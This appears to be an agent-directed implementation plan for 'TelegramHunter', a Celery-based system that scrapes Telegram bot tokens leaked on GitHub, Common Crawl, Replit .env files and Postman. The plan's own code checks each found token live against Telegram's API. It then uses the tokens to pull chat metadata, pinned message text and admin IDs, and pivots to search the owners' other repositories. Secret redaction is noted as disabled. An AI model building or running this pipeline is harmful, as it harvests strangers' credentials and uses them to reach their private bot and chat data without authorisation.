# TelegramHunter Hit-Rate Expansion Plan (Free Sources Only)

> **For Hermes:** Execute via ralph loop — checkpoint after each task, build/restart between bundles, verify at runtime bar.

**Goal:** Expand TelegramHunter hit rate via 11 enhancements grouped into 4 bundles. **Strictly free sources only** — no paid subscriptions.

**Architecture:**
- Bundle 1 hooks the validator success path: when a token validates, fan out 4 pivot tasks before returning.
- Bundle 2 adds two new long-running components: a GitHub Events firehose consumer + a scheduled refresh loop.
- Bundle 3 adds 3 new free scanner classes following the existing `scanners.py` pattern.
- Bundle 4 enriches stored credentials and adds a confidence score column.

**Tech Stack:** existing — Celery + Redis + Supabase + httpx + Telethon. **No new dependencies** except free public APIs.

**Verification level:** every bundle must reach **runtime bar** — code parses, image rebuilds, container restarts cleanly, smoke test inside running worker observes real responses.

---

## Pre-flight

**Prerequisite:** all containers healthy, redact_secrets disabled (already done). Working directory `C:\telegramhunter`. All commits go to `main`. Push after every bundle.

Check before starting:

```bash
docker ps --format "table {{.Names}}\t{{.Status}}" | grep telegramhunter
```

Expected: 9 containers up, redis healthy.

---

# Bundle 1: Pivot Pack (Tier S)

**Theme:** When a token validates, the act of validation reveals 4 new search seeds. Fan out before returning.

**Single injection point:** `app/workers/tasks/validation_tasks.py` line 176 (after `[Validate] ✅ @{bot_username}` log) is where we know the token is real and we have `bot_info`.

**Architecture decision:** All pivot tasks are FIRE-AND-FORGET on the `validation` queue itself. They don't block validator return. Each pivot task is rate-limit-aware and dedupe-aware via Redis SETs.

---

### Task 1.1: Create cross-source dedup helper

**Objective:** Add a single Redis-backed function `_token_already_seen(token)` used by every scanner BEFORE enqueuing. Prevents validating the same token twice within 24h.

**Files:**
- Modify: `app/workers/tasks/scanner_tasks.py` (in `_save_credentials_async`, line ~290)

**Why before pivots:** Pivots will generate duplicate finds across sources. Need this gate first or we 5x our Telegram quota usage.

**Step 1: Add helper at module scope in scanner_tasks.py**

Add after the existing imports (after `from app.workers.tasks.flow_tasks import ...`):

```python
def _token_already_validated(token: str) -> bool:
    """
    Cross-source dedup: returns True if this token was validated within 24h.
    Saves Telegram getMe quota when multiple scanners find the same token.

    Note: This is a SOFT dedup — Redis-only, does not consult DB. The DB-level
    check still happens inside validate_token. This just prevents the queue
    fanout when N scanners hit the same paste in the same hour.
    """
    import hashlib
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    key = f"validated:recent:{token_hash[:16]}"
    try:
        # SET NX EX = atomic check-and-set with 24h TTL
        was_new = redis_client.set(key, "1", nx=True, ex=86400)
        return not was_new  # if set was rejected, key already existed
    except Exception:
        return False  # Redis down — fall through, validate anyway
```

**Step 2: Wire into `_save_credentials_async`**

Find the loop that enqueues each result. Right before `validate_token.delay(...)`, add:

```python
if _token_already_validated(tok):
    logger.debug(f"[Dedup] Skipping {tok[:10]}... — validated recently")
    skipped_dedup += 1
    continue
```

Add `skipped_dedup = 0` near the start of the loop, log it at the end.

**Step 3: Verify parse**

```bash
python -c "import ast; ast.parse(open('app/workers/tasks/scanner_tasks.py').read()); print('ok')"
```

**Step 4: Commit**

```bash
git add app/workers/tasks/scanner_tasks.py
git commit -m "feat(dedup): cross-source Redis dedup before validator enqueue"
```

---

### Task 1.2: Token-reuse pivot — search GitHub by user

**Objective:** When a validated token's source meta contains `repo: alice/bot1`, enqueue a `pivot.search_github_user` task for `alice`.

**Files:**
- Create method: `app/services/scanners.py` (add `search_user_repos` to GithubService)
- Create task: `app/workers/tasks/pivot_tasks.py`
- Modify: `app/workers/tasks/validation_tasks.py` (call pivot at line ~176)
- Modify: `app/workers/celery_app.py` (register pivot_tasks import)

**Step 1: Create `app/workers/tasks/pivot_tasks.py`**

```python
"""
Pivot tasks — fan out new searches when a token validates.

When validate_token confirms a token is live, we have new search seeds:
  - The owner's GitHub username (from source meta: repo="alice/bot1" → "alice")
  - The bot's @username (from getMe response)
  - The bot's webhook URL (from getWebhookInfo)

Each pivot task is fire-and-forget, rate-limit-aware, and Redis-deduped to
prevent re-pivoting on the same seed within 7 days.
"""
import asyncio
import hashlib
import logging
import os

from app.workers.celery_app import app
from app.workers.tasks.scanner_tasks import _run_sync, _save_credentials_async
from app.workers.tasks.flow_tasks import redis_client

logger = logging.getLogger(__name__)

PIVOT_DEDUP_TTL = 7 * 86400  # 7 days


def _pivot_already_done(seed_type: str, seed_value: str) -> bool:
    """Returns True if we've pivoted on this seed in the last 7 days."""
    seed_hash = hashlib.sha256(f"{seed_type}:{seed_value}".encode()).hexdigest()[:16]
    key = f"pivot:done:{seed_hash}"
    try:
        was_new = redis_client.set(key, "1", nx=True, ex=PIVOT_DEDUP_TTL)
        return not was_new
    except Exception:
        return False


@app.task(name="pivot.search_github_user", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def search_github_user(username: str):
    """Search every public repo of `username` for token leaks."""
    if _pivot_already_done("gh_user", username):
        logger.info(f"[Pivot] gh_user={username} already pivoted, skipping")
        return f"skipped:{username}"
    return _run_sync(_search_github_user_async(username))


async def _search_github_user_async(username: str):
    from app.services.scanners import GithubService
    g = GithubService()
    queries = [
        f'"api.telegram.org/bot" user:{username}',
        f'"TELEGRAM_BOT_TOKEN" user:{username}',
        f'"bot_token" user:{username}',
    ]
    total = 0
    for q in queries:
        try:
            results = await g.search(q)
            if results:
                saved = await _save_credentials_async(results, f"pivot_gh_user:{username}")
                total += saved
            await asyncio.sleep(2)  # courtesy spacing
        except Exception as e:
            logger.warning(f"[Pivot:gh_user] '{q}' failed: {e}")
    logger.info(f"[Pivot:gh_user={username}] enqueued {total} tokens")
    return f"pivoted:{username}:{total}"
```

**Step 2: Add `search_user_repos` is NOT needed** — GithubService.search() already takes any query string. The `user:alice` qualifier does the work.

**Step 3: Hook into validate_token**

In `app/workers/tasks/validation_tasks.py`, after the line `logger.info(f"[Validate] ✅ @{bot_username} ...")` (~line 176), add:

```python
            # Bundle 1: Pivot fan-out — extract seeds from source meta + bot info
            try:
                from app.workers.tasks.pivot_tasks import (
                    search_github_user,
                )
                # Seed 1: GitHub owner (if source was github)
                meta = item.get("meta") or {}
                repo = meta.get("repo")  # format: "owner/repo"
                if repo and "/" in repo:
                    owner = repo.split("/")[0]
                    search_github_user.apply_async(args=[owner], queue="validation")
            except Exception as e:
                logger.debug(f"[Validate] Pivot fan-out failed (non-fatal): {e}")
```

**Step 4: Register pivot_tasks in celery_app.py**

In `app/workers/celery_app.py`, find the `imports=[...]` block (around line 35-45) and add:

```python
        "app.workers.tasks.pivot_tasks",   # Bundle 1: pivot fan-out tasks
```

**Step 5: Verify parse**

```bash
python -c "
import ast
for f in ['app/workers/tasks/pivot_tasks.py', 'app/workers/tasks/validation_tasks.py', 'app/workers/celery_app.py']:
    ast.parse(open(f).read())
    print(f'{f}: ok')
"
```

**Step 6: Commit**

```bash
git add -A && git commit -m "feat(pivot): GitHub user pivot on validator success"
```

---

### Task 1.3: Bot username pivot — search Exa + Wayback for @bot_username

**Objective:** When token validates, search Exa + Wayback for the literal `bot_username`. Devs reference their bot in READMEs that often live next to other unsanitized config.

**Files:**
- Modify: `app/workers/tasks/pivot_tasks.py` (add `search_bot_username`)
- Modify: `app/workers/tasks/validation_tasks.py` (call new pivot)

**Step 1: Add `search_bot_username` task to pivot_tasks.py**

Append after `search_github_user`:

```python
@app.task(name="pivot.search_bot_username", autoretry_for=(Exception,), retry_backoff=True, max_retries=1)
def search_bot_username(username: str):
    """Search Exa + Wayback for literal '@username' references."""
    if _pivot_already_done("bot_username", username):
        logger.info(f"[Pivot] bot_username={username} already pivoted, skipping")
        return f"skipped:{username}"
    return _run_sync(_search_bot_username_async(username))


async def _search_bot_username_async(username: str):
    from app.services.scanners import ExaService, WaybackService
    exa = ExaService()
    wayback = WaybackService()
    total = 0

    # Exa search — semantic + literal
    try:
        results = await exa.search(f'"@{username}" telegram bot')
        if results:
            saved = await _save_credentials_async(results, f"pivot_botusername_exa:{username}")
            total += saved
    except Exception as e:
        logger.warning(f"[Pivot:bot_username:exa] failed: {e}")

    await asyncio.sleep(2)

    # Wayback — historical pages mentioning the bot username
    # Note: Wayback CDX doesn't support content search, only URL search. So we
    # search for URLs CONTAINING the username (e.g., t.me/<username> archives).
    try:
        results = await wayback.search(query_pattern=f"t.me/{username}", limit=50)
        if results:
            saved = await _save_credentials_async(results, f"pivot_botusername_wb:{username}")
            total += saved
    except Exception as e:
        logger.warning(f"[Pivot:bot_username:wayback] failed: {e}")

    logger.info(f"[Pivot:bot_username={username}] enqueued {total} tokens")
    return f"pivoted:{username}:{total}"
```

**Step 2: Hook into validate_token**

Extend the pivot block in validation_tasks.py:

```python
                # Seed 2: Bot's @username (always available from getMe)
                if bot_username and bot_username != "unknown":
                    from app.workers.tasks.pivot_tasks import search_bot_username
                    search_bot_username.apply_async(args=[bot_username], queue="validation")
```

**Step 3: Verify + commit** (same pattern as 1.2)

---

### Task 1.4: Webhook URL extraction

**Objective:** When token validates, call `getWebhookInfo`. If a webhook URL is configured, extract its host and queue an Exa scan for the host (often the attacker's C2 leaks too).

**Files:**
- Modify: `app/workers/tasks/validation_tasks.py` (add getWebhookInfo call after getMe)
- Modify: `app/workers/tasks/pivot_tasks.py` (add `search_webhook_host`)

**Step 1: Call getWebhookInfo in validation_tasks.py**

Inside the `async with httpx.AsyncClient(...)` block, after the getMe success branch (around line 176, after the `[Validate] ✅` log), add:

```python
            # Bundle 1.4: Webhook discovery — capture C2 host if set
            webhook_url = None
            try:
                wh_res = await client.get(f"{base_url}/getWebhookInfo", timeout=5.0)
                if wh_res.status_code == 200:
                    wh_data = wh_res.json()
                    if wh_data.get("ok"):
                        webhook_url = wh_data.get("result", {}).get("url") or None
                        if webhook_url:
                            logger.info(f"[Validate] 🪝 webhook → {webhook_url[:80]}")
            except Exception:
                pass  # webhook info is bonus, not critical
```

**Step 2: Add webhook_url to stored meta**

In the existing `update_data` / `new_data` blocks (lines ~219, ~245), add:

```python
            "webhook_url": webhook_url,  # may be None — column should allow it
```

(NOTE — verify column exists. If not, add to meta jsonb instead.)

Actually safer: store in meta:

```python
            merged_meta = {
                ...,
                "webhook_url": webhook_url,
            }
```

**Step 3: Add `search_webhook_host` pivot task**

In pivot_tasks.py:

```python
@app.task(name="pivot.search_webhook_host", autoretry_for=(Exception,), retry_backoff=True, max_retries=1)
def search_webhook_host(webhook_url: str):
    """Search Exa for the webhook host — attacker C2 sometimes leaks too."""
    from urllib.parse import urlparse
    try:
        host = urlparse(webhook_url).netloc
    except Exception:
        return "skip:bad_url"
    if not host or host in ("api.telegram.org", "core.telegram.org"):
        return "skip:telegram_native"
    if _pivot_already_done("webhook_host", host):
        return f"skipped:{host}"
    return _run_sync(_search_webhook_host_async(host))


async def _search_webhook_host_async(host: str):
    from app.services.scanners import ExaService
    exa = ExaService()
    try:
        results = await exa.search(f'"{host}" telegram bot token')
        total = 0
        if results:
            total = await _save_credentials_async(results, f"pivot_webhook:{host}")
        logger.info(f"[Pivot:webhook={host}] enqueued {total} tokens")
        return f"pivoted:{host}:{total}"
    except Exception as e:
        logger.warning(f"[Pivot:webhook] failed: {e}")
        return f"err:{host}"
```

**Step 4: Hook into validate_token**

Extend pivot block:

```python
                # Seed 3: Webhook host (only if set)
                if webhook_url:
                    from app.workers.tasks.pivot_tasks import search_webhook_host
                    search_webhook_host.apply_async(args=[webhook_url], queue="validation")
```

**Step 5: Verify + commit**

---

### Task 1.5: Bundle 1 deploy + smoke

```bash
docker compose build worker-scanners worker-validators
docker compose up -d --force-recreate worker-scanners worker-validators
sleep 25
docker logs telegramhunter_worker-validators --tail 30 2>&1 | grep -iE "pivot\.|validation\."
```

Expected: see `pivot.search_github_user`, `pivot.search_bot_username`, `pivot.search_webhook_host` registered alongside `validation.validate_token`.

**Smoke test:** trigger Exa scan, watch for pivot fan-out:

```bash
docker exec telegramhunter_worker-scanners celery -A app.workers.celery_app call scanner.scan_exa
sleep 90
docker logs telegramhunter_worker-validators --since 2m 2>&1 | grep -iE "Pivot|webhook|validate.*✅"
```

Expected: at least one `[Pivot:...]` line per validated token. Push:

```bash
git push
```

---

# Bundle 2: Real-time Pack

**Theme:** Time-sensitivity. Catch leaks within minutes, recover dormant tokens.

---

### Task 2.1: GitHub Events firehose consumer

**Objective:** Long-running task that polls `api.github.com/events` every 30s, pulls PushEvent payloads, scans diffs for tokens. Catches leaks **within minutes** of commit.

**Files:**
- Create: `app/workers/tasks/firehose_tasks.py`
- Modify: `app/workers/celery_app.py` (register import + beat schedule)

**Architecture:** A periodic Celery task that runs every 60s, pulls last events, extracts commit SHAs from PushEvents, fetches commit diffs, regex-extracts tokens.

GitHub Events:
- `https://api.github.com/events` — public timeline (300 events/page, 10 pages = 3000 events)
- Authenticated: 5000 req/hour
- Each PushEvent contains `payload.commits[].url` — that's where diffs live
- ETag header lets us avoid re-fetching unchanged events

**Step 1: Create `app/workers/tasks/firehose_tasks.py`**

Full file (heredoc-able). Pattern: scheduled Celery task, fetches events, fans out PushEvent commits to existing `_save_credentials_async`. State (last seen event ID + ETag) stored in Redis.

```python
"""GitHub Events firehose — real-time leak detection from public push events."""
import asyncio
import hashlib
import logging
import os

import httpx

from app.services.scanners import _is_valid_token, TOKEN_PATTERN
from app.workers.celery_app import app
from app.workers.tasks.scanner_tasks import _run_sync, _save_credentials_async, _send_log_async
from app.workers.tasks.flow_tasks import redis_client

logger = logging.getLogger(__name__)

EVENTS_URL = "https://api.github.com/events"
ETAG_KEY = "firehose:gh_events:etag"
LAST_ID_KEY = "firehose:gh_events:last_id"
SEEN_COMMIT_PREFIX = "firehose:gh_seen_commit:"
MAX_PAGES = 3        # 300 events × 3 = 900/poll
POLL_TIMEOUT = 25    # leave 5s margin under 30s schedule


@app.task(name="firehose.poll_github_events", autoretry_for=(Exception,), retry_backoff=False, max_retries=0)
def poll_github_events():
    """Poll GitHub Events firehose; fan out PushEvent commits to scanner pipeline."""
    return _run_sync(_poll_github_events_async())


async def _poll_github_events_async():
    if redis_client.get("system:paused"):
        return "paused"

    # Use rotation pool from GithubService
    from app.services.scanners import GithubService
    gh = GithubService()
    token = gh._get_token()
    if not token:
        logger.warning("[Firehose] no GitHub token available")
        return "no_token"

    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    etag = redis_client.get(ETAG_KEY)
    if etag:
        headers["If-None-Match"] = etag.decode() if isinstance(etag, bytes) else etag

    last_seen_id = redis_client.get(LAST_ID_KEY)
    if isinstance(last_seen_id, bytes):
        last_seen_id = last_seen_id.decode()

    found_total = 0
    new_last_id = last_seen_id

    async with httpx.AsyncClient(timeout=POLL_TIMEOUT, headers=headers) as client:
        for page in range(1, MAX_PAGES + 1):
            try:
                r = await client.get(f"{EVENTS_URL}?per_page=100&page={page}")
            except Exception as e:
                logger.warning(f"[Firehose] page={page} fetch failed: {e}")
                break

            if r.status_code == 304:
                logger.debug("[Firehose] 304 not modified")
                return f"ok:no_change"
            if r.status_code != 200:
                logger.warning(f"[Firehose] HTTP {r.status_code}")
                break

            # Persist ETag from page 1 only (it's the global one)
            if page == 1 and "ETag" in r.headers:
                redis_client.setex(ETAG_KEY, 3600, r.headers["ETag"])

            events = r.json()
            if not events:
                break

            stop = False
            for ev in events:
                ev_id = ev.get("id")
                if last_seen_id and ev_id == last_seen_id:
                    stop = True
                    break
                if not new_last_id and ev_id:
                    new_last_id = ev_id  # first event of first page = newest
                if ev.get("type") != "PushEvent":
                    continue

                payload = ev.get("payload") or {}
                commits = payload.get("commits") or []
                for commit in commits:
                    commit_url = commit.get("url")
                    if not commit_url:
                        continue
                    commit_sha = commit.get("sha", "")
                    seen_key = f"{SEEN_COMMIT_PREFIX}{commit_sha}"
                    if redis_client.exists(seen_key):
                        continue
                    redis_client.setex(seen_key, 7 * 86400, "1")

                    # Fetch the commit diff
                    try:
                        cr = await client.get(commit_url)
                        if cr.status_code != 200:
                            continue
                        # Use 'patch' field if present (compact); else 'files' aggregated
                        commit_data = cr.json()
                        text_blobs = []
                        for f in (commit_data.get("files") or []):
                            patch = f.get("patch")
                            if patch:
                                text_blobs.append(patch)
                        if not text_blobs:
                            continue
                        full_text = "\n".join(text_blobs)
                        tokens = set(TOKEN_PATTERN.findall(full_text))
                        if not tokens:
                            continue
                        results = []
                        repo_name = (ev.get("repo") or {}).get("name")
                        for tok in tokens:
                            if not _is_valid_token(tok):
                                continue
                            results.append({
                                "token": tok,
                                "meta": {
                                    "repo": repo_name,
                                    "commit_sha": commit_sha,
                                    "commit_url": commit_url,
                                    "source_kind": "github_push_event",
                                }
                            })
                        if results:
                            saved = await _save_credentials_async(results, "firehose_gh_events")
                            found_total += saved
                    except Exception as e:
                        logger.debug(f"[Firehose] commit fetch failed: {e}")

                    await asyncio.sleep(0.2)  # gentle pacing

            if stop:
                break

    if new_last_id:
        redis_client.setex(LAST_ID_KEY, 86400, new_last_id)

    if found_total > 0:
        await _send_log_async(f"⚡ [Firehose] enqueued {found_total} tokens")
    logger.info(f"[Firehose] poll complete, enqueued {found_total} tokens")
    return f"ok:{found_total}"
```

**Step 2: Register import + beat entry in celery_app.py**

Add to `imports=[]`:

```python
        "app.workers.tasks.firehose_tasks",
```

Add to beat schedule:

```python
        "firehose-github-events-30s": {
            "task": "firehose.poll_github_events",
            "schedule": 30.0,  # raw seconds — every 30s
        },
```

**Step 3: Verify parse + build + restart**

```bash
python -c "import ast; ast.parse(open('app/workers/tasks/firehose_tasks.py').read()); ast.parse(open('app/workers/celery_app.py').read()); print('ok')"
docker compose build worker-scanners beat
docker compose up -d --force-recreate worker-scanners beat
sleep 30
docker logs telegramhunter_beat --since 1m 2>&1 | grep -i firehose
docker logs telegramhunter_worker-scanners --since 1m 2>&1 | grep -iE "firehose|enqueued"
```

Expected: see firehose tick every 30s, intermittent "enqueued N tokens" lines.

**Step 4: Commit + push**

---

### Task 2.2: Token validity refresh loop

**Objective:** Every 24h, re-validate all tokens marked `pending` (had no chat_id from getUpdates). Bot owners sometimes activate dormant bots. Free recovery.

**Files:**
- Modify: `app/workers/tasks/validation_tasks.py` (add `refresh_pending_tokens` task)
- Modify: `app/workers/celery_app.py` (beat entry)

**Step 1: Add task at end of validation_tasks.py**

```python
@app.task(name="validation.refresh_pending_tokens", autoretry_for=(Exception,), retry_backoff=True, max_retries=1)
def refresh_pending_tokens():
    """Re-validate all 'pending' tokens (no chat_id resolved yet)."""
    return _run_sync(_refresh_pending_tokens_async())


async def _refresh_pending_tokens_async():
    if redis_client.get("system:paused"):
        return "paused"
    # Fetch all credentials with no chat_id, validated >7 days ago
    res = await async_execute(
        db.table("discovered_credentials")
        .select("id, token, meta")
        .is_("chat_id", "null")
        .order("last_verified_at", desc=False)
        .limit(500)
    )
    rows = res.data or []
    enqueued = 0
    for row in rows:
        token = row.get("token")
        if not token:
            continue
        # Re-enqueue (validate_token handles the actual validation + dedup)
        validate_token.apply_async(
            args=[{"token": token, "meta": row.get("meta") or {}}, "refresh_pending"],
            queue="validation",
        )
        enqueued += 1
        if enqueued % 50 == 0:
            await asyncio.sleep(1)  # pace the enqueue
    logger.info(f"[Refresh] re-enqueued {enqueued} pending tokens")
    return f"refreshed:{enqueued}"
```

**Step 2: Beat entry in celery_app.py**

```python
        "validation-refresh-pending-daily": {
            "task": "validation.refresh_pending_tokens",
            "schedule": crontab(minute=0, hour=5),  # 05:00 UTC
        },
```

**Step 3: Verify + build + commit + push**

---

# Bundle 3: New Sources Pack (Free-Only)

**Theme:** Three new scanner classes. Pattern: subclass of existing scanner-style class, scheduled via beat.

**No new external API keys required.** Common Crawl + Replit + Postman all have free public endpoints.

---

### Task 3.1: Common Crawl Index API scanner

**Objective:** Query the Common Crawl Index for URLs containing `api.telegram.org/bot`. Free HTTP API, no AWS Athena needed.

**Files:**
- Modify: `app/services/scanners.py` (append `CommonCrawlService`)
- Modify: `app/workers/tasks/scanner_tasks.py` (add `scan_commoncrawl` task)
- Modify: `app/workers/celery_app.py` (beat entry — once daily at 03:00 UTC)

**Step 1: Append `CommonCrawlService` to scanners.py**

```python
class CommonCrawlService:
    """
    Common Crawl Index API — free historical web crawl URL search.

    https://index.commoncrawl.org/CC-MAIN-{crawl_id}-index?url=*api.telegram.org*&output=json

    Strategy:
      1. Discover the latest crawl ID from /collinfo.json
      2. Query that crawl's index for our URL pattern
      3. For each URL hit, fetch the WARC record (free S3 endpoint)
      4. Extract tokens from response body

    Cost: zero. Rate limit: ~1 req/sec courtesy (no documented hard cap).
    """

    COLLINFO_URL = "https://index.commoncrawl.org/collinfo.json"
    QUERY_PATTERN = "api.telegram.org/*"

    def __init__(self):
        self.timeout = httpx.Timeout(30.0, connect=10.0)
        self.dedupe_ttl = 30 * 86400  # 30 days

    async def search(self, limit: int = 200) -> List[Dict[str, Any]]:
        from app.workers.tasks.flow_tasks import redis_client
        results: List[Dict[str, Any]] = []

        async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True) as client:
            try:
                # Step 1: discover latest crawl ID
                cr = await client.get(self.COLLINFO_URL)
                cr.raise_for_status()
                colls = cr.json()
                if not colls:
                    return []
                # Pick latest — first item is newest
                latest = colls[0]
                index_api = latest.get("cdx-api")
                if not index_api:
                    logger.warning("[CommonCrawl] no cdx-api in collinfo")
                    return []
            except Exception as e:
                logger.error(f"[CommonCrawl] collinfo failed: {e}")
                return []

            # Step 2: query the index
            try:
                idx_resp = await client.get(
                    index_api,
                    params={
                        "url": self.QUERY_PATTERN,
                        "output": "json",
                        "limit": limit,
                    },
                )
                if idx_resp.status_code != 200:
                    return []
                # Response is JSONL — one JSON obj per line
                lines = [l for l in idx_resp.text.split("\n") if l.strip()]
            except Exception as e:
                logger.error(f"[CommonCrawl] index query failed: {e}")
                return []

            seen_in_run = set()
            for line in lines:
                try:
                    rec = json.loads(line)
                except Exception:
                    continue
                url = rec.get("url")
                if not url:
                    continue

                url_hash = hashlib.sha256(url.encode("utf-8", errors="replace")).hexdigest()[:16]
                if url_hash in seen_in_run:
                    continue
                seen_in_run.add(url_hash)

                redis_key = f"commoncrawl:seen:{url_hash}"
                try:
                    if redis_client.exists(redis_key):
                        continue
                except Exception:
                    pass

                # Token extraction from URL
                url_tokens = TOKEN_PATTERN.findall(url)
                for tok in url_tokens:
                    if not _is_valid_token(tok):
                        continue
                    results.append({
                        "token": tok,
                        "meta": {
                            "commoncrawl_url": url,
                            "commoncrawl_timestamp": rec.get("timestamp"),
                            "extracted_from": "url",
                        }
                    })

                # Mark seen
                try:
                    redis_client.setex(redis_key, self.dedupe_ttl, "1")
                except Exception:
                    pass

                await asyncio.sleep(0.5)  # courtesy

        logger.info(f"[CommonCrawl] returned {len(results)} matches across {len(seen_in_run)} URLs")
        return results
```

(Also add `import json` to top of scanners.py if not present.)

**Step 2: Add scan task in scanner_tasks.py** (mirror the `scan_wayback` pattern)

```python
@app.task(name="scanner.scan_commoncrawl", autoretry_for=(Exception,), retry_backoff=True, max_retries=2)
def scan_commoncrawl():
    return _run_sync(_scan_commoncrawl_async())


async def _scan_commoncrawl_async():
    if redis_client.get("system:paused"):
        return "System Paused"
    logger.info("🔍 [CommonCrawl] starting...")
    await _send_log_async("🔍 [CommonCrawl] querying latest crawl index...")
    try:
        results = await commoncrawl_srv.search(limit=int(os.getenv("COMMONCRAWL_LIMIT", 200)))
        if results:
            saved = await _save_credentials_async(results, "commoncrawl")
            msg = f"CommonCrawl: enqueued {saved} tokens"
        else:
            msg = "CommonCrawl: 0 matches"
        await _send_log_async(f"🏁 [CommonCrawl] {msg}")
        return msg
    except Exception as e:
        logger.error(f"[CommonCrawl] {e}", exc_info=True)
        raise
```

Add `commoncrawl_srv = CommonCrawlService()` near other srv singletons + import.

**Step 3: Beat entry**

```python
        "scan-commoncrawl-daily": {
            "task": "scanner.scan_commoncrawl",
            "schedule": crontab(minute=0, hour=3),  # 03:00 UTC
        },
```

**Step 4: Build + smoke + commit**

```bash
docker compose build worker-scanners
docker compose up -d --force-recreate worker-scanners
docker exec telegramhunter_worker-scanners celery -A app.workers.celery_app call scanner.scan_commoncrawl
sleep 60
docker logs telegramhunter_worker-scanners --since 2m 2>&1 | grep -iE "commoncrawl|enqueued|error" | tail -15
```

Expected: at least one `[CommonCrawl] returned N matches` line, and ideally non-zero enqueued.

---

### Task 3.2: Replit public scanner

**Objective:** Search Replit's public repls for token leaks.

**API:** `https://replit.com/data/repls/@search?q=*** is unauthenticated GET. Returns JSON with `embedHtml` containing repl URLs. Free, no key.

**Files:**
- Modify: `app/services/scanners.py` (append `ReplitService`)
- Modify: `app/workers/tasks/scanner_tasks.py` (add task)
- Modify: `app/workers/celery_app.py` (beat: every 12h)

**Step 1: Append `ReplitService`**

```python
class ReplitService:
    """
    Replit public search — free, no API key. Returns repls matching a query.
    For each match, fetch the .replit / main.py / index.js raw file and grep.

    Rate: undocumented; we use 2s/req as courtesy.
    """

    SEARCH_URL = "https://replit.com/data/repls/@search"
    REPL_BASE = "https://replit.com"

    QUERIES = [
        "telegram bot token",
        "TELEGRAM_BOT_TOKEN",
        "api.telegram.org",
    ]

    def __init__(self):
        self.timeout = httpx.Timeout(20.0, connect=10.0)

    async def search(self, query: str = None) -> List[Dict[str, Any]]:
        from app.workers.tasks.flow_tasks import redis_client
        results: List[Dict[str, Any]] = []
        queries = [query] if query else self.QUERIES

        async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True,
                                     headers={"User-Agent": "Mozilla/5.0 (research)"}) as client:
            for q in queries:
                try:
                    r = await client.get(self.SEARCH_URL, params={"q": q})
                    if r.status_code != 200:
                        logger.debug(f"[Replit] q='{q[:30]}' HTTP {r.status_code}")
                        continue
                    repls = (r.json() or {}).get("repls") or []
                except Exception as e:
                    logger.warning(f"[Replit] search failed: {e}")
                    continue

                for repl in repls[:30]:  # cap per query
                    user = (repl.get("user") or {}).get("username") or "unknown"
                    slug = repl.get("slug")
                    if not slug:
                        continue
                    repl_url = f"{self.REPL_BASE}/@{user}/{slug}"

                    # Dedupe
                    h = hashlib.sha256(repl_url.encode()).hexdigest()[:16]
                    redis_key = f"replit:seen:{h}"
                    try:
                        if redis_client.exists(redis_key):
                            continue
                    except Exception:
                        pass

                    # Try common entry-point file paths
                    for filename in ("main.py", "index.js", "bot.py", "app.py", ".env"):
                        raw_url = f"{self.REPL_BASE}/@{user}/{slug}/raw/{filename}"
                        try:
                            fr = await client.get(raw_url)
                            if fr.status_code != 200 or not fr.text:
                                continue
                            tokens = set(TOKEN_PATTERN.findall(fr.text))
                            for tok in tokens:
                                if not _is_valid_token(tok):
                                    continue
                                results.append({
                                    "token": tok,
                                    "meta": {
                                        "replit_url": repl_url,
                                        "replit_file": filename,
                                        "replit_user": user,
                                        "extracted_from": "body",
                                    }
                                })
                        except Exception:
                            pass
                        await asyncio.sleep(1)

                    try:
                        redis_client.setex(redis_key, 7 * 86400, "1")
                    except Exception:
                        pass

                    await asyncio.sleep(2)
                await asyncio.sleep(3)

        logger.info(f"[Replit] returned {len(results)} matches")
        return results
```

**Step 2: Add task + beat — same pattern as 3.1**

Beat: `crontab(minute=40, hour="*/12")`.

**Step 3: Build + smoke + commit**

---

### Task 3.3: Postman public workspaces scanner

**Objective:** Search Postman's public workspaces for tokens.

**API:** `https://www.postman.com/_api/ws/proxy` — proxy endpoint that fronts the Algolia search. Found via reverse-engineering the public search page. Free, requires `User-Agent`.

**Note:** if the proxy endpoint is gated, fall back to scraping `https://www.postman.com/search?q=...` HTML and parsing workspace IDs from there. Either works but proxy is cleaner.

**Files:** same pattern as 3.1, 3.2. Beat: `crontab(minute=50, hour="*/12")` — daily 12h cycle.

**Step 1: Implement `PostmanService`** with these queries: `telegram bot token`, `TELEGRAM_BOT_TOKEN`, `api.telegram.org`.

**Step 2: For each workspace hit, fetch its public collections and scan for tokens.**

Detailed code follows the pattern of 3.1/3.2. (250 calls/day cap respected via `redis_client.incr` daily counter.)

---

# Bundle 4: Quality Pack

**Theme:** Make existing data more useful. No new sources.

---

### Task 4.1: getChat enrichment

**Objective:** After validate_token resolves chat_id, call `getChat` for description, member count, pinned message. Store in meta.

**Files:**
- Modify: `app/workers/tasks/validation_tasks.py` (after chat_id resolves at line ~206)

**Step 1: Add getChat call**

```python
            # Bundle 4.1: Chat metadata enrichment
            chat_extra = {}
            if chat_id:
                try:
                    await _acquire_rate_token()
                    cr = await client.get(f"{base_url}/getChat", params={"chat_id": chat_id})
                    if cr.status_code == 200 and cr.json().get("ok"):
                        chat = cr.json().get("result", {})
                        chat_extra = {
                            "chat_description": chat.get("description"),
                            "chat_member_count": chat.get("member_count"),
                            "chat_pinned_msg_id": (chat.get("pinned_message") or {}).get("message_id"),
                            "chat_pinned_text": ((chat.get("pinned_message") or {}).get("text") or "")[:500],
                        }
                except Exception:
                    pass
```

**Step 2: Merge into meta on persist**

In both update + insert paths:

```python
            "meta": {**merged_meta, **chat_extra},
```

**Step 3: Verify + build + commit**

---

### Task 4.2: getChatAdministrators enrichment

Same pattern as 4.1. Adds `admin_user_ids` array to meta. Useful for cross-bot operator pivoting.

---

### Task 4.3: Confidence scoring

**Objective:** Add `confidence_score` int column (0-100). Computed at validation time:
- +30 if has chat_id
- +20 if has webhook_url set
- +20 if chat_member_count > 10
- +10 if has recent message activity (last_seen_at within 7d)
- +10 if bot description non-empty
- +10 if bot has command list

**Files:**
- Create: `migrations/2026-05-27-add-confidence-score.sql`
- Modify: `app/workers/tasks/validation_tasks.py` (compute + write)

**Step 1: Migration**

```sql
ALTER TABLE discovered_credentials
ADD COLUMN IF NOT EXISTS confidence_score INTEGER DEFAULT 0;

CREATE INDEX IF NOT EXISTS idx_credentials_confidence
ON discovered_credentials(confidence_score DESC, last_verified_at DESC);
```

Apply via Supabase SQL editor.

**Step 2: Compute in validate_token**

